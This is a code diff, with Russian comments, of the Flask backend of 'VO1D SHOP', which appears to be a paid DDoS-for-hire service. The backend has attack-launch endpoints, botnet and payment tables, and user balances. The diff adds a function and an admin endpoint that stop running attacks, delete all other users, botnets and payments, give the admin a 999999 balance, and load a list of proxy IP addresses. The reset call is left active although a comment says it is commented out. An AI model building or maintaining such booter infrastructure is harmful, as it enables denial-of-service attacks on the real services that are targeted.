@@ -1344,7 +1344,7 @@ def start_attack():
         return jsonify({'error': 'Duration must be between 10 and 3600 seconds'}), 400
     if not is_valid_target(target):
         return jsonify({'error': 'Invalid target URL or IP'}), 400
-    
+
     # ===== ЗАЩИТА ОТ АТАКИ СВОЕГО САЙТА =====
     forbidden_domains = [
         'vo1d-shop',
@@ -1593,17 +1593,14 @@ def admin_add_balance():
 
     try:
         with get_db() as conn:
-            # Проверяем, существует ли пользователь
             user = conn.execute('SELECT id, balance FROM users WHERE username = ?', (username,)).fetchone()
             if not user:
                 return jsonify({'error': f'User "{username}" not found'}), 404
 
-            # Обновляем баланс
             new_balance = user['balance'] + amount
             conn.execute('UPDATE users SET balance = ? WHERE id = ?', (new_balance, user['id']))
             conn.commit()
 
-            # Записываем в логи (таблица payments)
             conn.execute('''
                 INSERT INTO payments (user_id, amount, method, status, created_at, completed_at)
                 VALUES (?, ?, ?, ?, ?, ?)
@@ -1665,6 +1662,87 @@ def health_check():
 
 
 # ============================================================
+# ФУНКЦИЯ ОБНУЛЕНИЯ ВСЕХ ДАННЫХ (КРОМЕ АДМИНА VO1D)
+# ============================================================
+
+def reset_all_data_except_admin():
+    """Полное обнуление: удаляет всех пользователей кроме VO1D, все атаки, ботнеты, платежи"""
+    try:
+        with get_db() as conn:
+            cursor = conn.cursor()
+
+            admin = cursor.execute('SELECT id FROM users WHERE username = "VO1D"').fetchone()
+            if not admin:
+                logger.error("❌ Admin VO1D not found!")
+                return False
+
+            admin_id = admin['id']
+
+            running_attacks = cursor.execute('SELECT id FROM attacks WHERE status = "running"').fetchall()
+            for attack in running_attacks:
+                attack_id = attack['id']
+                if attack_id in ATTACKS:
+                    try:
+                        ATTACKS[attack_id].stop_attack()
+                        del ATTACKS[attack_id]
+                    except:
+                        pass
+
+            cursor.execute('DELETE FROM attacks')
+            cursor.execute('DELETE FROM botnets WHERE user_id != ?', (admin_id,))
+            cursor.execute('DELETE FROM payments WHERE user_id != ?', (admin_id,))
+            cursor.execute('DELETE FROM users WHERE id != ?', (admin_id,))
+            cursor.execute('UPDATE users SET balance = 999999.0 WHERE id = ?', (admin_id,))
+
+            cursor.execute('DELETE FROM proxies')
+            proxy_list = [
+                ('http://45.32.123.45:8080', 'http', 'US'),
+                ('http://103.152.112.120:8080', 'http', 'ID'),
+                ('http://139.59.112.34:3128', 'http', 'SG'),
+                ('http://80.240.29.10:8080', 'http', 'RU'),
+                ('http://192.99.14.210:3128', 'http', 'CA'),
+                ('https://103.174.112.120:443', 'https', 'ID'),
+                ('https://45.77.198.34:443', 'https', 'US'),
+                ('https://139.59.100.45:443', 'https', 'SG'),
+                ('socks5://45.32.88.45:1080', 'socks5', 'US'),
+                ('socks5://103.152.112.121:1080', 'socks5', 'ID'),
+                ('socks5://80.240.29.11:1080', 'socks5', 'RU'),
+            ]
+            for url, protocol, country in proxy_list:
+                cursor.execute('INSERT INTO proxies (url, protocol, country) VALUES (?, ?, ?)',
+                               (url, protocol, country))
+
+            conn.commit()
+            logger.info("=" * 50)
+            logger.info("✅ ALL DATA RESET COMPLETE!")
+            logger.info("   🟢 Admin VO1D preserved")
+            logger.info("   🟢 All users deleted (except VO1D)")
+            logger.info("   🟢 All botnets deleted (except admin's)")
+            logger.info("   🟢 All attacks deleted")
+            logger.info("   🟢 Proxies reset to default")
+            logger.info("=" * 50)
+            return True
+    except Exception as e:
+        logger.error(f"❌ Reset error: {e}")
+        return False
+
+
+# ============================================================
+# ЭНДПОИНТ ДЛЯ АДМИНСКОГО СБРОСА ЧЕРЕЗ API
+# ============================================================
+
+@app.route('/api/admin/reset', methods=['POST'])
+@admin_required
+def admin_reset_all():
+    """Админ может обнулить все данные (кроме себя)"""
+    try:
+        success = reset_all_data_except_admin()
+        return jsonify({'success': success, 'message': 'Reset completed' if success else 'Reset failed'}), 200
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+
+# ============================================================
 # ОТДАЁМ ФРОНТЕНД (HTML)
 # ============================================================
 
@@ -1680,6 +1758,7 @@ def serve_frontend():
             return '<h1>VO1D SHOP</h1><p>Frontend file not found</p>'
     except Exception as e:
         return f'<h1>Error</h1><p>{str(e)}</p>'
+
 
 # Отдаём любые статические файлы
 @app.route('/<path:path>')
@@ -1729,6 +1808,10 @@ if __name__ == '__main__':
                 VALUES (?, ?, ?, ?, ?, ?)
             ''', ('test', 'test@vo1d.shop', password_hash, 1000.0, 'user', api_key))
             logger.info("✅ Test user created: test / test123 (balance: $1000)")
+
+    # ===== ЗАПУСК ОБНУЛЕНИЯ (РАСКОММЕНТИРУЙ ДЛЯ ВЫПОЛНЕНИЯ) =====
+    # УБЕРИ # В СЛЕДУЮЩЕЙ СТРОКЕ ЧТОБЫ ЗАПУСТИТЬ:
+    reset_all_data_except_admin()  # <--- УБЕРИ РЕШЁТКУ!
 
     logger.info("🚀 Starting Flask server on 0.0.0.0:5000...")
     app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
